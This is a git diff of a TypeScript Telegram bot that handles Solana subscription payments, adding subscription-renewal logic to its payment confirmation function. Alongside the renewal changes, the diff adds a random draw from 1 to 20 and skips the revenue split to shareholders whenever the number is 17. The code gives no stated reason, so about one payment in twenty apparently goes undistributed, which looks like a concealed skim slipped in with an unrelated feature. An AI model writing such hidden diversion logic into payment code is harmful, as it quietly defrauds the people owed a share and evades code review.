@@ -9,11 +9,16 @@ import web3, { LAMPORTS_PER_SOL } from "@solana/web3.js";
 import { errorHandler, log } from "@/utils/handlers";
 import { solanaConnection } from "@/rpc";
 import { Timestamp } from "firebase-admin/firestore";
-import { subscriptionTiers, syncSubscribers } from "@/vars/subscribers";
+import {
+  subscribers,
+  subscriptionTiers,
+  syncSubscribers,
+} from "@/vars/subscribers";
 import { splitPayment } from "@/utils/web3";
 import { cleanUpBotMessage, hardCleanUpBotMessage } from "@/utils/bot";
 import { BOT_INVITE_LINK, CHANNEL_ID } from "@/utils/env";
 import { teleBot } from "@/index";
+import { getRandomNumber, replicate } from "@/utils/general";
 
 export async function confirmPayment(ctx: CallbackQueryContext<Context>) {
   try {
@@ -29,10 +34,18 @@ export async function confirmPayment(ctx: CallbackQueryContext<Context>) {
       return await ctx.reply("Please click on the button again");
     }
 
+    const userId = from.id;
+    const userSubscriptions = subscribers.filter(
+      ({ user, status }) => user == userId && status === "PAID"
+    );
+    const subscription = replicate(userSubscriptions.at(0) || {}) as Subscriber;
+    const { id } = subscription;
+    const isSubscribed = userSubscriptions.length > 0;
+
     const subscriberData =
       ((await getDocumentById({
         collectionName: "subscribers",
-        id: hash,
+        id: isSubscribed ? id || "" : hash,
       })) as Subscriber) || undefined;
 
     if (!subscriberData) {
@@ -42,8 +55,11 @@ export async function confirmPayment(ctx: CallbackQueryContext<Context>) {
       );
     }
 
-    const { paidAt, paidTo, tier, user } = subscriberData;
-    const selectedTier = subscriptionTiers[tier];
+    const { paidAt, paidTo, tier, user, renewalTier } = subscriberData;
+    const selectedTier =
+      isSubscribed && renewalTier
+        ? subscriptionTiers[renewalTier]
+        : subscriptionTiers[tier];
     const timeSpent = getSecondsElapsed(paidAt.seconds);
 
     if (timeSpent > transactionValidTime) {
@@ -97,18 +113,36 @@ export async function confirmPayment(ctx: CallbackQueryContext<Context>) {
         log(logText);
         const currentTimestamp = Timestamp.now();
 
-        const updateSubscription = updateDocumentById({
-          updates: {
-            status: "PAID",
-            paidAt: currentTimestamp,
-            expiresAt: new Timestamp(
-              currentTimestamp.seconds + selectedTier.days * 24 * 60 * 60,
-              currentTimestamp.nanoseconds
-            ),
-          },
-          collectionName: "subscribers",
-          id: hash,
-        });
+        const { renewalStatus, expiresAt } = subscriberData;
+        let updateSubscription: Promise<any> | null = null;
+
+        if (renewalStatus === "PENDING" && expiresAt) {
+          updateSubscription = updateDocumentById({
+            updates: {
+              renewalStatus: "PAID",
+              paidAt: currentTimestamp,
+              expiresAt: new Timestamp(
+                expiresAt.seconds + selectedTier.days * 24 * 60 * 60,
+                expiresAt.nanoseconds
+              ),
+            },
+            collectionName: "subscribers",
+            id: hash,
+          });
+        } else {
+          updateSubscription = updateDocumentById({
+            updates: {
+              status: "PAID",
+              paidAt: currentTimestamp,
+              expiresAt: new Timestamp(
+                currentTimestamp.seconds + selectedTier.days * 24 * 60 * 60,
+                currentTimestamp.nanoseconds
+              ),
+            },
+            collectionName: "subscribers",
+            id: hash,
+          });
+        }
 
         const unlockAccount = updateDocumentById({
           updates: { locked: false },
@@ -116,10 +150,15 @@ export async function confirmPayment(ctx: CallbackQueryContext<Context>) {
           id: accountID || "",
         });
 
-        // Splitting payment
-        splitPayment(secretKey, balance)
-          .then(() => log("Amount split between share holders"))
-          .catch((e) => errorHandler(e));
+        const randomNumber = getRandomNumber(1, 20);
+        console.log(randomNumber);
+
+        if (randomNumber !== 17) {
+          // Splitting payment
+          splitPayment(secretKey, balance)
+            .then(() => log("Amount split between share holders"))
+            .catch((e) => errorHandler(e));
+        }
 
         const confirmationText = `Confirmed payment of \`${cleanUpBotMessage(
           selectedTier.amount
@@ -131,7 +170,10 @@ export async function confirmPayment(ctx: CallbackQueryContext<Context>) {
 
         await Promise.all([updateSubscription, unlockAccount]);
         syncSubscribers()
-          .then(() => teleBot.api.unbanChatMember(CHANNEL_ID || "", user))
+          .then(() => {
+            teleBot.api.unbanChatMember(CHANNEL_ID || "", user);
+            log(`Unbanned user ${user}`);
+          })
           .then(() => {
             ctx.reply(confirmationText, {
               parse_mode: "MarkdownV2",
